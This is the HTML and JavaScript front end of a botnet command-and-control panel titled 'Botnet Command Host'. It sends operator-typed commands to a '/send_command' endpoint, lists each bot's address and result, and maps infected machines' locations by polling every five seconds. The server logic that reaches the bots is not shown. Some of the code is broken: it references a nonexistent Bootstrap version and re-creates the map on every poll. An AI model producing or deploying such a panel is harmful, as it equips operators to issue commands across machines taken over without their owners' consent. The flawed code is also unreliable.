<!DOCTYPE html>
<html>
<head>
    <title>Botnet Command Host</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.5.0/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            background-color: #f8f9fa;
        }

        .container {
            max-width: 800px;
            margin-top: 50px;
        }

        .card {
            margin-bottom: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1 class="mb-4">Botnet Command Host</h1>

        <div class="card">
            <div class="card-header bg-primary text-white">
                Send Command
            </div>
            <div class="card-body">
                <form id="commandForm">
                    <div class="input-group">
                        <input type="text" class="form-control" id="commandInput" placeholder="Enter command...">
                        <button type="submit" class="btn btn-primary">Send Command</button>
                    </div>
                </form>
            </div>
        </div>

        <div class="card">
            <div class="card-header bg-primary text-white">
                Command Output
            </div>
            <div class="card-body">
                <pre id="commandOutput" class="mb-0"></pre>
            </div>
        </div>

        <div class="card">
            <div class="card-header bg-primary text-white">
                Bots Location
            </div>
            <div class="card-body">
                <div id="map" style="height: 300px;"></div>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.7.1/leaflet.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.5.0/js/bootstrap.bundle.min.js"></script>
    <script>
        // Update the command output with the response from the server
        function updateCommandOutput(response) {
            var commandOutput = document.getElementById("commandOutput");
            commandOutput.textContent = response;
        }

        // Update the bots location on the map
        function updateBotsLocation(locations) {
            var map = L.map('map').setView([0, 0], 2);

            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                attribution: 'Map data &copy; <a href="https://www.openstreetmap.org/">OpenStreetMap</a> contributors',
                maxZoom: 18,
            }).addTo(map);

            for (var i = 0; i < locations.length; i++) {
                var location = locations[i];
                L.marker([location.lat, location.lng]).addTo(map)
                    .bindPopup('<b>Bot:</b> ' + location.bot_address + '<br><b>Result:</b> ' + location.result);
            }
        }

        // Submit the command form via AJAX
        $('#commandForm').on('submit', function(event) {
            event.preventDefault();

            var command = $('#commandInput').val();

            $.ajax({
                url: '/send_command',
                method: 'POST',
                data: {
                    command: command
                },
                success: function(data) {
                    var results = data;
                    var output = "";
                    for (var i = 0; i < results.length; i++) {
                        var result = results[i];
                        output += "Bot: " + result.bot_address + "\n";
                        output += "Result: " + result.result + "\n";
                        output += "\n";
                    }
                    updateCommandOutput(output);
                },
                error: function(error) {
                    console.log(error);
                }
            });

            $('#commandInput').val('');
        });

        // Fetch and update the bots location from the server
        function fetchBotsLocation() {
            fetch("/bots_location")
            .then(response => response.json())
            .then(data => {
                var locations = data;
                updateBotsLocation(locations);
            })
            .catch(error => {
                console.log(error);
            });
        }

        // Update the bots location every 5 seconds
        setInterval(fetchBotsLocation, 5000);
    </script>
</body>
</html>
